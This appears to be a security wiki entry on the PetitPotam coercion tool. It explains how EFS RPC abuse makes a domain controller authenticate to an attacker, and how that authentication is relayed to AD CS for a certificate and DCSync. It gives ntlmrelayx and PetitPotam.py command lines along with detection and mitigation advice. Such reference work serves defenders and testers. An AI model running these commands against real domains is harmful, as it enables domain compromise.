---
title: PetitPotam
type: entity
created: 2026-09-06
updated: 2026-09-06
tags: [tool, python, coercion, ntlm-relay, ad-cs, esc8]
---

# PetitPotam

**Petit Potam** (by topotam) is the canonical **ESC8 coercion** tool: it
abuses the **EFS (Encrypting File System) RPC** interface to make a Domain
Controller (or any target) **initiate an NTLM authentication to the
attacker**. That captured machine-account NTLM auth is then relayed (via
[[ntlmrelayx]]) to AD CS web enrollment (or SMB/LDAP) to mint a certificate
or take an action — the core of [[esc8-ntlm-relay-adcs]] and
[[ntlm-relay-coercion]].

## How it works

1. The attacker sets up an NTLM relay listener (e.g.
   `ntlmrelayx.py -t http://ca/certsrv/... --adcs`).
2. `PetitPotam.py <attacker-ip> <dc>` tells the DC to request a file to be
   EFS-encrypted, which makes the **DC authenticate to the attacker's IP**
   over NTLM (SMB).
3. The attacker relays that DC (machine-account) NTLM auth to the target
   (AD CS web enrollment) → obtains a **machine cert** → often straight to
   [[dcsync]] (the machine account can replicate) or further privilege.

## Why the DC's machine account

- The DC's computer account typically has **DCSync** rights
  (`GetChanges`/`GetChangesAll`) — a cert for it is a DCSync ticket
  ([[esc8-ntlm-relay-adcs]]).
- It's a **high-priv** identity (Tier-0), so a relayed auth to it is worth a
  lot.

## Common invocations

```bash
# Attacker host — start the relay listener first (target = AD CS):
ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp -smb2support --adcs --template Machine -whitelist <dc-ip>

# Then (another terminal / host) trigger the DC to auth to the attacker:
PetitPotam.py <attacker-ip> <dc>
# output: the DC authenticated to <attacker-ip> -> relayed to the CA -> cert issued
```

```bash
# Variants: target SMB instead of AD CS
ntlmrelayx.py -t smb://<target> -smb2support
PetitPotam.py <attacker-ip> <dc>
```

## Detection

- **4624 Type 3** — the **DC's computer account** (`DC$`) authenticating to a
  *workstation/attacker* IP over SMB — the high-fidelity coercion tell.
- **EFS RPC activity** from the DC (a `EncryptFile`/`AddKeys` request to an
  odd target).
- **AD CS** — a machine-account cert request (4768 PKINIT / cert issuance)
  right after the coercion.
- **5136/4769** downstream (RBCD / delegation) if the relay went to LDAPS.

## Mitigations

- **Restrict EFS RPC** — block the EFS interface to non-DC hosts, or require
  the DC to only EFS-auth to expected hosts.
- **SMB signing + NTLM restrictions** on the relay targets (see
  [[ntlm-relay-coercion]]).
- **Alert on** a `DC$` Type-3 logon to a non-DC IP, and on AD CS cert requests
  by machine accounts.
- [[ad-tiering-and-hardening]] — limit what a DC machine-account can touch.

## Links

- [[ntlm-relay-coercion]] — the coercion + relay hub
- [[esc8-ntlm-relay-adcs]] — the full ESC8 chain (PetitPotam → relay → cert → DCSync)
- [[ntlmrelayx]] — the relay listener it pairs with
- [[dcsync]] — the DC machine account's privilege the chain harvests
- [[ad-cs-esc-attacks]] — the AD CS target (ESC8/ESC11)
- [[mitm6-ipv6-relay]] — the credential-less (no-PetitPotam) alternative

## References

- [PetitPotam (topotam)](https://github.com/topotam/PetitPotam)
- [topotam: PetitPotam write-up](https://topotam.medium.com/)
- [SpecterOps / ired.team: ESC8](https://www.ired.team/active-directory-kerberos-abuse/abusing-active-directory-certificate-services)
